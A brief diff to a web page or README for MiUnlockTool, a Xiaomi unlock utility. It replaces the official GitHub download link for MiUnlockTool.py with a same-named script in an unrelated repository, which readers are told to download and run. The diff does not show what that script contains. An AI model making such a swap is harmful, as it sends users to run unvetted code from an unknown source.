@@ -18,7 +18,7 @@
 <h2>For Windows, Linux, MacOS :</h2>
 <ol>
   <li>Install Python3</li>
-  <li>Download <a href="https://github.com/offici5l/MiUnlockTool/releases/latest/download/MiUnlockTool.py">MiUnlockTool</a> and run it</li>
+  <li>Download <a href="https://github.com/abhitimi/abhi/releases/latest/download/MiUnlockTool.py">abhi</a> and run it</li>
 </ol>
 
 <h2>For Android :</h2>
